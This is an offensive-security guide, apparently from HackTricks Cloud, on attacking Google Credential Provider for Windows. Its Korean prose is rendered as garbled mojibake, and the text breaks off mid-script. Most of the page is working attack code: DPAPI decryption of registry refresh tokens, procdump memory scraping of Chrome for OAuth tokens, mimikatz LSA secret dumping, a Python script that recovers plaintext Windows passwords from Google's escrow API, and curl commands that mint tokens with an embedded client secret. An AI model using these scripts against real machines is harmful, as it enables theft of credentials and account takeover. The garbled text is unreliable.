# GWS - Workspace Sync Attacks (GCPW, GCDS, Directory Sync with AD & EntraID)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## GCPW - Google Credential Provider for Windows

ì´ê²ƒì€ Google Workspacesê°€ ì œê³µí•˜ëŠ” ë‹¨ì¼ ë¡œê·¸ì¸ìœ¼ë¡œ, ì‚¬ìš©ìê°€ **ìì‹ ì˜ Workspace ìê²© ì¦ëª…**ì„ ì‚¬ìš©í•˜ì—¬ Windows PCì— ë¡œê·¸ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ, ì´ëŠ” PCì˜ ì¼ë¶€ ìœ„ì¹˜ì— Google Workspaceì— ì ‘ê·¼í•˜ê¸° ìœ„í•œ í† í°ì„ ì €ì¥í•©ë‹ˆë‹¤.

{% hint style="success" %}
Note that [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) is capable to detect **GCPW**, get information about the configuration and **even tokens**.
{% endhint %}

### GCPW - MitM

ì‚¬ìš©ìê°€ GCPWë¥¼ í†µí•´ Google Workspaceì™€ ë™ê¸°í™”ëœ Windows PCì— ì ‘ê·¼í•  ë•Œ, ì¼ë°˜ ë¡œê·¸ì¸ ì–‘ì‹ì„ ì™„ë£Œí•´ì•¼ í•©ë‹ˆë‹¤. ì´ ë¡œê·¸ì¸ ì–‘ì‹ì€ PCê°€ ìƒˆë¡œ ê³ ì¹¨ í† í°ê³¼ êµí™˜í•  OAuth ì½”ë“œë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤. 

{% code overflow="wrap" %}
```http
POST /oauth2/v4/token HTTP/2
Host: www.googleapis.com
Content-Length: 311
Content-Type: application/x-www-form-urlencoded
[...headers...]

scope=https://www.google.com/accounts/OAuthLogin
&grant_type=authorization_code
&client_id=77185425430.apps.googleusercontent.com
&client_secret=OTJgUOQcT7lO7GsGZq2G4IlT
&code=4/0AVG7fiQ1NKncRzNrrGjY5S02wBWBJxV9kUNSKvB1EnJDCWyDmfZvelqKp0zx8jRGmR7LUw
&device_id=d5c82f70-71ff-48e8-94db-312e64c7354f
&device_type=chrome
```
{% endcode %}

ìƒˆë¡œìš´ ì¤„ì´ ì¶”ê°€ë˜ì–´ ê°€ë…ì„±ì´ í–¥ìƒë˜ì—ˆìŠµë‹ˆë‹¤.

{% hint style="info" %}
PCì— `Proxifier`ë¥¼ ì„¤ì¹˜í•˜ê³  `utilman.exe` ë°”ì´ë„ˆë¦¬ë¥¼ `cmd.exe`ë¡œ ë®ì–´ì“´ í›„ Windows ë¡œê·¸ì¸ í˜ì´ì§€ì—ì„œ **ì ‘ê·¼ì„± ê¸°ëŠ¥**ì„ ì‹¤í–‰í•˜ì—¬ MitMì„ ìˆ˜í–‰í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ì´ë¡œ ì¸í•´ **CMD**ê°€ ì‹¤í–‰ë˜ë©°, ì—¬ê¸°ì„œ **Proxifierë¥¼ ì‹¤í–‰í•˜ê³  êµ¬ì„±**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
`Proxifier`ì—ì„œ QUICK UDP íŠ¸ë˜í”½ì„ **ì°¨ë‹¨**í•˜ëŠ” ê²ƒì„ ìŠì§€ ë§ˆì„¸ìš”. ì´ë ‡ê²Œ í•˜ë©´ TCP í†µì‹ ìœ¼ë¡œ ë‹¤ìš´ê·¸ë ˆì´ë“œë˜ì–´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ "ì„œë¹„ìŠ¤ ë° ê¸°íƒ€ ì‚¬ìš©ì"ì—ì„œ ë‘ ê°€ì§€ ì˜µì…˜ì„ êµ¬ì„±í•˜ê³  Windowsì— Burp CA ì¸ì¦ì„œë¥¼ ì„¤ì¹˜í•˜ì„¸ìš”.
{% endhint %}

ë˜í•œ **`HKLM:\SOFTWARE\Google\GCPW`**ì— `enable_verbose_logging = 1` ë° `log_file_path = C:\Public\gcpw.log` í‚¤ë¥¼ ì¶”ê°€í•˜ë©´ ì¼ë¶€ ë¡œê·¸ë¥¼ ì €ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### GCPW - ì§€ë¬¸

GCPWê°€ ì¥ì¹˜ì— ì„¤ì¹˜ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸í•˜ë ¤ë©´ ë‹¤ìŒ í”„ë¡œì„¸ìŠ¤ê°€ ì¡´ì¬í•˜ëŠ”ì§€ ë˜ëŠ” ë‹¤ìŒ ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤ê°€ ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
Write-Output "The process gcpw_xtension.exe is running."
} else {
Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```
In **`HKCU:\SOFTWARE\Google\Accounts`**ì—ì„œ ì‚¬ìš©ìì˜ ì´ë©”ì¼ê³¼ ì•”í˜¸í™”ëœ **refresh token**ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤, ë§Œì•½ ì‚¬ìš©ìê°€ ìµœê·¼ì— ë¡œê·¸ì¸í–ˆë‹¤ë©´.

In **`HKLM:\SOFTWARE\Google\GCPW\Users`**ì—ì„œ `domains_allowed` í‚¤ì— ë¡œê·¸ì¸í•  ìˆ˜ ìˆëŠ” **domains**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìœ¼ë©°, í•˜ìœ„ í‚¤ì—ì„œëŠ” ì´ë©”ì¼, ì‚¬ì§„, ì‚¬ìš©ì ì´ë¦„, í† í° ìˆ˜ëª…, í† í° í•¸ë“¤ ë“± ì‚¬ìš©ìì— ëŒ€í•œ ì •ë³´ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="info" %}
í† í° í•¸ë“¤ì€ `eth.`ë¡œ ì‹œì‘í•˜ëŠ” í† í°ìœ¼ë¡œ, ë‹¤ìŒê³¼ ê°™ì€ ìš”ì²­ì„ í†µí•´ ì¼ë¶€ ì •ë³´ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'token_handle=eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg'
# Example response
{
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 12880152
}
```
{% endcode %}

ì•¡ì„¸ìŠ¤ í† í°ì˜ í† í° í•¸ë“¤ì„ ì°¾ëŠ” ê²ƒë„ ê°€ëŠ¥í•œë°, ë‹¤ìŒê³¼ ê°™ì€ ìš”ì²­ì„ í†µí•´ ê°€ëŠ¥í•©ë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'access_token=<access token>'
# Example response
{
"issued_to": "77185425430.apps.googleusercontent.com",
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 1327,
"access_type": "offline",
"token_handle": "eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg"
}
```
{% endcode %}

ë‚´ê°€ ì•„ëŠ” í•œ, í† í° í•¸ë“¤ì—ì„œ ë¦¬í”„ë ˆì‹œ í† í°ì´ë‚˜ ì•¡ì„¸ìŠ¤ í† í°ì„ ì–»ëŠ” ê²ƒì€ ë¶ˆê°€ëŠ¥í•˜ë‹¤.
{% endhint %}

ê²Œë‹¤ê°€, íŒŒì¼ **`C:\ProgramData\Google\Credential Provider\Policies\<sid>\PolicyFetchResponse`**ëŠ” `enableDmEnrollment`, `enableGcpAutoUpdate`, `enableMultiUserLogin` (ì—¬ëŸ¬ ì‚¬ìš©ìê°€ Workspaceì—ì„œ ì»´í“¨í„°ì— ë¡œê·¸ì¸í•  ìˆ˜ ìˆëŠ”ì§€ ì—¬ë¶€) ë° `validityPeriodDays` (ì‚¬ìš©ìê°€ Googleì— ì§ì ‘ ì¬ì¸ì¦í•  í•„ìš”ê°€ ì—†ëŠ” ì¼ìˆ˜)ì™€ ê°™ì€ ë‹¤ì–‘í•œ **ì„¤ì •** ì •ë³´ë¥¼ í¬í•¨í•˜ëŠ” jsonì´ë‹¤.

### GCPW - ë ˆì§€ìŠ¤íŠ¸ë¦¬ ë¦¬í”„ë ˆì‹œ í† í°

ë ˆì§€ìŠ¤íŠ¸ë¦¬ **`HKCU:\SOFTWARE\Google\Accounts`** ë‚´ì—ì„œ **`refresh_token`**ì´ ì•”í˜¸í™”ëœ ì¼ë¶€ ê³„ì •ì„ ì°¾ì„ ìˆ˜ ìˆì„ ê²ƒì´ë‹¤. ë©”ì„œë“œ **`ProtectedData.Unprotect`**ëŠ” ì´ë¥¼ ì‰½ê²Œ ë³µí˜¸í™”í•  ìˆ˜ ìˆë‹¤.

<details>

<summary><strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> ë°ì´í„° ê°€ì ¸ì˜¤ê¸° ë° ë¦¬í”„ë ˆì‹œ í† í° ë³µí˜¸í™”</summary>
```powershell
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
param (
[string]$keyPath
)

# Get all values within the current key
$registryKey = Get-Item -Path $keyPath
$foundToken = $false

# Loop through properties to find refresh_token
foreach ($property in $registryKey.Property) {
if ($property -eq "refresh_token") {
$foundToken = $true
try {
# Get the raw bytes of the refresh_token from the registry
$encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

# Decrypt the bytes using ProtectedData.Unprotect
$decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

Write-Output "Path: $keyPath"
Write-Output "Decrypted refresh_token: $decryptedToken"
Write-Output "-----------------------------"
}
catch {
Write-Output "Path: $keyPath"
Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
Write-Output "-----------------------------"
}
}
}

# Recursively process all subkeys
Get-ChildItem -Path $keyPath | ForEach-Object {
Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
}
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```
</details>

ì˜ˆì‹œ ì¶œë ¥:

{% code overflow="wrap" %}
```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI
```
{% endcode %}

[**ì´ ë¹„ë””ì˜¤**](https://www.youtube.com/watch?v=FEQxHRRP\_5I)ì—ì„œ ì„¤ëª…í•œ ë°”ì™€ ê°™ì´, ë ˆì§€ìŠ¤íŠ¸ë¦¬ì—ì„œ í† í°ì„ ì°¾ì§€ ëª»í•œ ê²½ìš° **`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`**ì—ì„œ ê°’ì„ ìˆ˜ì •(ë˜ëŠ” ì‚­ì œ)í•  ìˆ˜ ìˆìœ¼ë©°, ì‚¬ìš©ìê°€ ì»´í“¨í„°ì— ë‹¤ì‹œ ì ‘ê·¼í•  ë•Œ ë‹¤ì‹œ ë¡œê·¸ì¸í•´ì•¼ í•˜ê³  **í† í°ì€ ì´ì „ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— ì €ì¥ë©ë‹ˆë‹¤**.

### GCPW - ë””ìŠ¤í¬ ìƒˆë¡œ ê³ ì¹¨ í† í°

íŒŒì¼ **`%LocalAppData%\Google\Chrome\User Data\Local State`**ëŠ” ì‚¬ìš©ìì˜ **Google Chrome í”„ë¡œí•„** ë‚´ì— ìˆëŠ” **`refresh_tokens`**ë¥¼ í•´ë…í•˜ëŠ” í‚¤ë¥¼ ì €ì¥í•©ë‹ˆë‹¤:

* `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
* `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

ì´ëŸ¬í•œ í† í°ì— ì ‘ê·¼í•˜ëŠ” **C# ì½”ë“œ**ëŠ” [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)ì—ì„œ í•´ë…ëœ ë°©ì‹ìœ¼ë¡œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ, ì•”í˜¸í™”ëŠ” ì´ ì½”ë“œì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216)

AESGCMì´ ì‚¬ìš©ë˜ë©°, ì•”í˜¸í™”ëœ í† í°ì€ **ë²„ì „**(**`v10`** í˜„ì¬)ìœ¼ë¡œ ì‹œì‘í•˜ê³ , [**12Bì˜ nonce**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L42)ê°€ ìˆìœ¼ë©°, ë§ˆì§€ë§‰ìœ¼ë¡œ **16Bì˜ mac**ì„ ê°€ì§„ **ì‚¬ì´í¼ í…ìŠ¤íŠ¸**ê°€ ìˆìŠµë‹ˆë‹¤.

### GCPW - í”„ë¡œì„¸ìŠ¤ ë©”ëª¨ë¦¬ì—ì„œ í† í° ë¤í”„í•˜ê¸°

ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ `procdump`ë¥¼ ì‚¬ìš©í•˜ì—¬ ëª¨ë“  **Chrome** í”„ë¡œì„¸ìŠ¤ë¥¼ **ë¤í”„**í•˜ê³ , **ë¬¸ìì—´**ì„ ì¶”ì¶œí•œ ë‹¤ìŒ **ì•¡ì„¸ìŠ¤ ë° ìƒˆë¡œ ê³ ì¹¨ í† í°**ê³¼ ê´€ë ¨ëœ ë¬¸ìì—´ì„ **ê²€ìƒ‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Chromeì´ ì¼ë¶€ Google ì‚¬ì´íŠ¸ì— ì—°ê²°ë˜ì–´ ìˆë‹¤ë©´, ì¼ë¶€ **í”„ë¡œì„¸ìŠ¤ê°€ ë©”ëª¨ë¦¬ì— ìƒˆë¡œ ê³ ì¹¨ ë°/ë˜ëŠ” ì•¡ì„¸ìŠ¤ í† í°ì„ ì €ì¥í•˜ê³  ìˆì„ ê²ƒì…ë‹ˆë‹¤!**

<details>

<summary>Chrome í”„ë¡œì„¸ìŠ¤ ë¤í”„ ë° í† í° ê²€ìƒ‰</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

`gcpw_extension.exe`ë¡œ ê°™ì€ ì‹œë„ë¥¼ í–ˆì§€ë§Œ ì–´ë–¤ í† í°ë„ ì°¾ì§€ ëª»í–ˆìŠµë‹ˆë‹¤.

ì–´ë–¤ ì´ìœ ë¡œ ì¸í•´, **ì¼ë¶€ ì¶”ì¶œëœ ì•¡ì„¸ìŠ¤ í† í°ì€ ìœ íš¨í•˜ì§€ ì•Šì„ ê²ƒì…ë‹ˆë‹¤ (ì¼ë¶€ëŠ” ìœ íš¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤)**. ë¤í”„ì—ì„œ ìœ íš¨í•œ í† í°ì„ ì–»ê¸° ìœ„í•´ ë¬¸ìë¥¼ í•˜ë‚˜ì”© ì œê±°í•˜ëŠ” ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹œë„í–ˆìŠµë‹ˆë‹¤. ìœ íš¨í•œ í† í°ì„ ì°¾ëŠ” ë°ëŠ” ë„ì›€ì´ ë˜ì§€ ì•Šì•˜ì§€ë§Œ, ì•„ë§ˆë„ ë„ì›€ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<details>

<summary>ë¬¸ìë¥¼ í•˜ë‚˜ì”© ì œê±°í•˜ì—¬ ì•¡ì„¸ìŠ¤ í† í° í™•ì¸</summary>
```bash
#!/bin/bash

# Define the initial access token
access_token="ya29.a0AcM612wWX6Pe3Pc6ApZYknGs5n66W1Hr1CQvF_L_pIm3uZaXWisWFabzxheYCHErRn28l2UOJuAbMzfn1TUpSKqvYvlhXJpxQsKEtwhYXzN2BZdOQNji0EXfF7po1_0WaxhwqOiE0CFQciiL8uAmkRsoXhq9ekC_S8xLrODZ2yKdDR6gSFULWaiIG-bOCFx3DkbOdbjAk-U4aN1WbglUAJdLZh7DMzSucIIZwKWvBxqqajSAjrdW0mRNVN2IfkcVLPndwj7fQJV2bQaCgYKAbQSAQ4SFQHGX2MiPuU1D-9-YHVzaFlUo_RwXA0277"

# Define the URL for the request
url="https://www.googleapis.com/oauth2/v1/tokeninfo"

# Loop until the token is 20 characters or the response doesn't contain "error_description"
while [ ${#access_token} -gt 20 ]; do
# Make the request and capture the response
response=$(curl -s -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=$access_token" $url)

# Check if the response contains "error_description"
if [[ ! "$response" =~ "error_description" ]]; then
echo "Success: Token is valid"
echo "Final token: $access_token"
echo "Response: $response"
exit 0
fi

# Remove the last character from the token
access_token=${access_token:0:-1}

echo "Token length: ${#access_token}"
done

echo "Error: Token invalid or too short"
```
</details>

### GCPW - í‰ë¬¸ ë¹„ë°€ë²ˆí˜¸ ë³µêµ¬

GCPWë¥¼ ì•…ìš©í•˜ì—¬ ë¹„ë°€ë²ˆí˜¸ì˜ í‰ë¬¸ì„ ë³µêµ¬í•˜ë ¤ë©´ **mimikatz**ë¥¼ ì‚¬ìš©í•˜ì—¬ **LSASS**ì—ì„œ ì•”í˜¸í™”ëœ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë¤í”„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
mimikatz_trunk\x64\mimikatz.exe token::elevate lsadump::secrets exit
```
ê·¸ëŸ° ë‹¤ìŒ ì´ë¯¸ì§€ì™€ ê°™ì´ `Chrome-GCPW-<sid>`ì™€ ê°™ì€ ë¹„ë°€ì„ ê²€ìƒ‰í•©ë‹ˆë‹¤:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption></figure>

ê·¸ëŸ° ë‹¤ìŒ, `https://www.google.com/accounts/OAuthLogin` ë²”ìœ„ë¥¼ ê°€ì§„ **ì•¡ì„¸ìŠ¤ í† í°**ìœ¼ë¡œ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë³µí˜¸í™”í•  ê°œì¸ í‚¤ë¥¼ ìš”ì²­í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<details>

<summary>ì•¡ì„¸ìŠ¤ í† í°, ì•”í˜¸í™”ëœ ë¹„ë°€ë²ˆí˜¸ ë° ë¦¬ì†ŒìŠ¤ IDë¥¼ ì‚¬ìš©í•˜ì—¬ í‰ë¬¸ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì–»ê¸° ìœ„í•œ ìŠ¤í¬ë¦½íŠ¸</summary>
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
try:
# Request to get the private key
response = requests.get(
f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
headers={
"Authorization": f"Bearer {access_token}"
}
)

# Check if the response is successful
if response.status_code == 200:
private_key = response.json()["base64PrivateKey"]
# Properly format the RSA private key
private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
return private_key
else:
raise ValueError(f"Failed to retrieve private key: {response.text}")

except requests.RequestException as e:
print(f"Error occurred while requesting the private key: {e}")
return None

def decrypt_password(access_token, lsa_secret):
try:
# Obtain the private key using the resource_id
resource_id = lsa_secret["resource_id"]
encrypted_data = b64decode(lsa_secret["encrypted_password"])

private_key_pem = get_decryption_key(access_token, resource_id)
print("Found private key:")
print(private_key_pem)

if private_key_pem is None:
raise ValueError("Unable to retrieve the private key.")

# Load the RSA private key
rsa_key = RSA.import_key(private_key_pem)
key_size = int(rsa_key.size_in_bits() / 8)

# Decrypt the encrypted data
cipher_rsa = PKCS1_OAEP.new(rsa_key)
session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

# Extract the session key and other data from decrypted payload
session_header = session_key[:32]
session_nonce = session_key[32:]
mac = encrypted_data[-16:]

# Decrypt the AES GCM data
aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

print("Decrypted Password:", decrypted_password.decode("utf-8"))

except Exception as e:
print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
"encrypted_password": "<encrypted-password>",
"resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```
</details>

ì´ê²ƒì˜ ì£¼ìš” êµ¬ì„± ìš”ì†Œë¥¼ Chromium ì†ŒìŠ¤ ì½”ë“œì—ì„œ ì°¾ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤:

* API ë„ë©”ì¸: [https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code](https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code)
* API ì—”ë“œí¬ì¸íŠ¸: [https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70](https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70)

### GCPW - ë¦¬í”„ë ˆì‹œ í† í°ìœ¼ë¡œ ì•¡ì„¸ìŠ¤ í† í° ìƒì„±í•˜ê¸°

ë¦¬í”„ë ˆì‹œ í† í°ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ìŒ ëª…ë ¹ì–´ì— ì§€ì •ëœ í´ë¼ì´ì–¸íŠ¸ IDì™€ í´ë¼ì´ì–¸íŠ¸ ë¹„ë°€ì„ ì‚¬ìš©í•˜ì—¬ ì•¡ì„¸ìŠ¤ í† í°ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCPW - Scopes

{% hint style="info" %}
ë¦¬í”„ë ˆì‹œ í† í°ì´ ìˆë”ë¼ë„, **ì•¡ì„¸ìŠ¤ í† í°ì„ ìƒì„±í•˜ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì§€ì›í•˜ëŠ” ë²”ìœ„**ë§Œ ìš”ì²­í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ì•¡ì„¸ìŠ¤ í† í°ì— ëŒ€í•œ ëª¨ë“  ë²”ìœ„ë¥¼ ìš”ì²­í•˜ëŠ” ê²ƒì€ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤.

ë˜í•œ, ë¦¬í”„ë ˆì‹œ í† í°ì€ ëª¨ë“  ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ìœ íš¨í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
{% endhint %}

ê¸°ë³¸ì ìœ¼ë¡œ GCPWëŠ” ì‚¬ìš©ìê°€ ëª¨ë“  ê°€ëŠ¥í•œ OAuth ë²”ìœ„ì— ì ‘ê·¼í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ, ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ `refresh_token`ìœ¼ë¡œ `access_token`ì„ ìƒì„±í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë²”ìœ„ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
